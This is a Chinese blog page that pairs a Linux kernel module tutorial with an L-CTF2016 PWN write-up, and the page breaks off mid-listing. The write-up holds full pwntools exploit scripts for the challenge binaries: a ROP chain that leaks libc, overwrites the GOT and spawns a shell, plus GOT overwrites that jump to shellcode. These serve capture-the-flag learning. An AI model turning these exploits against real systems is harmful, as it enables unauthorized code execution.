          <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>VirtualBox + Ubuntu12.04 32bit + linux-3.10.103内核<br>这次编译的是32位的内核，因此<code>64-bit kernel</code>一项不能选中，而且一般将内核源码放置在<code>/usr/src</code>目录下。<br>编译命令<code>make</code>执行完之后，会产生核心<code>bzImage</code>和可加载模块<code>modules</code>。<br>接着是安装过程：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make modules_install # 安装模块</span><br><span class="line">$ sudo make install # 安装核心</span><br><span class="line">$ mkinitramfs -o &#x2F;boot&#x2F;initrd.img-3.10.103 # 创建initrd文件</span><br><span class="line">$ cd &#x2F;boot&#x2F;grub</span><br><span class="line">$ sudo update-grub # 更新grub来显示自己安装的内核</span><br></pre></td></tr></table></figure>
<p>经过以上的步骤，内核基本上已经编译成功并且已经安装上了，重启即可使用自己编译的内核了。</p>
<h2 id="Hello-World模块"><a href="#Hello-World模块" class="headerlink" title="Hello World模块"></a>Hello World模块</h2><p>先写一个最简单的内核模块的”Hello World”模块：<br><strong>代码清单</strong> hello.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<p>所有模块代码中都包含<code>module.h</code>和<code>init.h</code>两个头文件，module.h包含可装载模块需要的大量符号和函数定义。包含init.h的目的是指定初始化和清除函数。大部分模块还包括<code>moduleparam.h</code>头文件，这样就可以在装载的时候向模块传递参数，下一节中会介绍。<br>接着需要用make来编译这个源文件，Makefile如下：<br><strong>代码清单</strong> Makefile  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello.o</span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="comment"># specify flags for the module compilation</span></span><br><span class="line">EXTRA_CFLAGS = -g -O0</span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> clean</span><br></pre></td></tr></table></figure>
<p>Makefile文件与源代码hello.c位于同一目录，开启其中的<code>EXTRA_CFLAGS = -g -O0</code>，可以包含调试信息。<code>CURDIR</code>是当前目录。<br>编译并加载和卸载模块：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ sudo insmod hello.ko # 加载模块需要root权限</span><br><span class="line">$ lsmod # 查看已经加载的模块</span><br><span class="line">Module           Size     Used by</span><br><span class="line">hello             590     0</span><br><span class="line">...</span><br><span class="line">$ sudo rmmod hello # 卸载模块</span><br><span class="line">$ dmesg # 查看内核信息</span><br><span class="line">...</span><br><span class="line">[4618.166833] Hello, world</span><br><span class="line">[4686.249465] Goodbye, cruel world</span><br></pre></td></tr></table></figure>

<h2 id="带参数的模块"><a href="#带参数的模块" class="headerlink" title="带参数的模块"></a>带参数的模块</h2><p><strong>代码清单</strong> hellop.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *whom = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> howmany = <span class="number">1</span>;</span><br><span class="line">module_param(howmany, <span class="keyword">int</span>, S_IRUGO);</span><br><span class="line">module_param(whom, charp, S_IRUGO);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; howmany; i++)</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;(%d) Hello, %s\n&quot;</span>, i, whom);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<p>参数必须使用<code>module_param</code>宏来声明，这个宏在<code>moduleparam.h</code>中定义。module_param需要三个参数：变量的名称、类型以及用于sysfs入口项的访问许可掩码，这个宏必须放在任何函数之外，通常在源文件头部。<br>Makefile和hello模块的基本相同：<br><strong>代码清单</strong> Makefile  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hellop.o</span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="comment"># specify flags for the module compilation</span></span><br><span class="line">EXTRA_CFLAGS = -g -O0</span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> clean</span><br></pre></td></tr></table></figure>
<p>编译加载和卸载模块：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod hellop.ko howmany&#x3D;10 whom&#x3D;&quot;Fan&quot;</span><br><span class="line">$ sudo rmmod hellop</span><br><span class="line">$ dmesg</span><br><span class="line">[23365.767137] (0) Hello, Fan</span><br><span class="line">[23365.767137] (1) Hello, Fan</span><br><span class="line">[23365.767137] (2) Hello, Fan</span><br><span class="line">[23365.767137] (3) Hello, Fan</span><br><span class="line">[23365.767137] (4) Hello, Fan</span><br><span class="line">[23365.767137] (5) Hello, Fan</span><br><span class="line">[23365.767137] (6) Hello, Fan</span><br><span class="line">[23365.767137] (7) Hello, Fan</span><br><span class="line">[23365.767137] (8) Hello, Fan</span><br><span class="line">[23365.767137] (9) Hello, Fan</span><br><span class="line">[23388.198252] Goodbye, cruel world</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br>《Linux设备驱动程序》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/19/L-CTF2016-PWN-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/19/L-CTF2016-PWN-Writeup/" class="post-title-link" itemprop="url">L-CTF2016 PWN Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-19 23:33:19" itemprop="dateCreated datePublished" datetime="2016-10-19T23:33:19+08:00">2016-10-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kVIyYer">题目下载</a></p>
<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p><img src="/images/lctfpwn/pwn100.png"><br>程序的漏洞很明显，考察的是exploit的编写。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gdb pwn100</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>开了NX不能用shellcode，程序也没给libc，因此第一步需要泄露libc中函数的地址，下面编写了一个leak内存的程序，作用是leak libc函数read()和puts()的实际地址：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">begin = <span class="number">0x40068e</span></span><br><span class="line">read_got = <span class="number">0x601028</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x400500</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;119.28.63.211&#x27;</span>, <span class="number">2332</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(address)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(begin)</span><br><span class="line">    payload += <span class="string">&#x27;C&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.readuntil(<span class="string">&#x27;bye~\n&#x27;</span>)</span><br><span class="line">        leak = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> leak[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;read address: &quot;</span> + <span class="built_in">hex</span>(u64(leak(read_got)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts address: &quot;</span> + <span class="built_in">hex</span>(u64(leak(puts_got)))</span><br></pre></td></tr></table></figure>
<p>运行结果：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;testserver.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;pwn100&#39;: Done</span><br><span class="line">read address: 0x7fe49c7d19a0</span><br><span class="line">puts address: 0x7fe49c74a5d0</span><br><span class="line">[*] Stopped program &#39;.&#x2F;pwn100&#39;</span><br></pre></td></tr></table></figure>
<p>因为libc的加载是页对齐的，所以低十二位不管怎么随机化都不会变。利用这个原理github上有一个叫<code>libc-database</code>的项目，可以根据任意两个libc函数的低十二位的值找到libc的对应版本，接着可以找到一些其他libc函数的偏移。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;find read 9a0 puts 5d0</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.23-0ubuntu3_amd64.deb (id libc6_2.23-0ubuntu3_amd64)</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so (id local-375198810bb39e6593a968fcbcf6556789026743)</span><br><span class="line">$ .&#x2F;dump local-375198810bb39e6593a968fcbcf6556789026743</span><br><span class="line">offset___libc_start_main_ret &#x3D; 0x20830</span><br><span class="line">offset_system &#x3D; 0x0000000000045380</span><br><span class="line">offset_dup2 &#x3D; 0x00000000000f70c0</span><br><span class="line">offset_read &#x3D; 0x00000000000f69a0</span><br><span class="line">offset_write &#x3D; 0x00000000000f6a00</span><br><span class="line">offset_str_bin_sh &#x3D; 0x18c58b</span><br></pre></td></tr></table></figure>
<p>下面就是完整的exploit：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">begin = <span class="number">0x40068e</span></span><br><span class="line">readn = <span class="number">0x40063d</span></span><br><span class="line">bss = <span class="number">0x601050</span></span><br><span class="line">read_got = <span class="number">0x601028</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x400500</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line">pop_rsi_pop_r15 = <span class="number">0x400761</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn100&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&#x27;119.28.63.211&#x27;, 2332)</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># leak read address</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"><span class="comment"># readn to bss</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(pop_rsi_pop_r15) <span class="comment"># 查找时是pop r15，但实际执行可能是pop rdi，调试可知</span></span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(bss) <span class="comment"># 这里要和rdi的值相同，防止若实际执行pop rdi，使rdi的值改变</span></span><br><span class="line">payload += p64(readn)</span><br><span class="line"><span class="comment"># return to begin()</span></span><br><span class="line">payload += p64(begin)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;payload len&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.readuntil(<span class="string">&#x27;bye~\n&#x27;</span>)</span><br><span class="line">leak = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">read_got = u64(leak[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># read@got</span></span><br><span class="line">read_offset = <span class="number">0xec690</span> <span class="comment"># 这里需要根据不同的libc进行修改</span></span><br><span class="line">system_offset = <span class="number">0x468f0</span></span><br><span class="line">libc_base = read_got - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system address: &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment"># 发送binsh字符串到bss</span></span><br><span class="line">r.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># readn to overwrite puts&#x27; got</span></span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(puts_got)</span><br><span class="line">payload2 += p64(pop_rsi_pop_r15)</span><br><span class="line">payload2 += p64(<span class="number">8</span>)</span><br><span class="line">payload2 += p64(puts_got)</span><br><span class="line">payload2 += p64(readn)</span><br><span class="line"><span class="comment"># execute system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(bss)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;payload2 len&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += <span class="string">&#x27;C&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;press enter to send system&quot;</span></span><br><span class="line">raw_input()</span><br><span class="line">r.send(p64(system_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h2><p><img src="/images/lctfpwn/pwn200.png"><br>这个函数里有一个栈地址泄露，把v2写满打印就会连<code>rbp</code>的值一同打印出来。<br><img src="/images/lctfpwn/pwn200-2.png"><br>这个函数里有一个栈溢出漏洞，buf的内容会覆盖dest的值，之后就可以向任意地址写内容。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gdb pwn200</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>发现栈可执行，用shellcode即可，下面是完整的exploit：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"><span class="comment"># pwntools自动生成的shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;who are u?\n&#x27;</span>)</span><br><span class="line">r.send(shellcode.ljust(<span class="number">48</span>)) <span class="comment"># shellcode写到welcome函数的v2变量里</span></span><br><span class="line">r.recvuntil(shellcode.ljust(<span class="number">48</span>)) <span class="comment"># 写满v2，泄露main函数的栈底位置</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">shellcode_addr = leak_addr - <span class="number">0x50</span> <span class="comment"># gdb动态调试可知相对位置</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;shellcode addr: &#x27;</span> + <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;give me money~\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 将free@got写为shellcode的地址，调用free即可执行shellcode</span></span><br><span class="line">payload = p64(shellcode_addr).ljust(<span class="number">56</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(free_got)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h2><p>程序运行错误，readelf发现缺少两个特殊的lib文件：libio和libgetshell。这是出题人自己实现的两个库文件：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d pwn300</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xee0 contains 13 entries:</span><br><span class="line">  Tag        Type                         Name&#x2F;Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libio.so]</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libgetshell.so]</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>为了能让程序正常运行，需要把lib文件放到系统目录里：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cp lib* &#x2F;usr&#x2F;local&#x2F;lib</span><br><span class="line">$ sudo ldconfig</span><br><span class="line">$ .&#x2F;pwn300</span><br></pre></td></tr></table></figure>
<p>这里是为了实验，实际没有提供lib文件，需要静态分析漏洞并利用。<br><img src="/images/lctfpwn/pwn300.png"><br>程序的漏洞很明显，又是考察exploit的编写，利用栈溢出dump所用的库文件libgetshell，跳转到其中的getshell函数即可，下面是完整的exploit：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 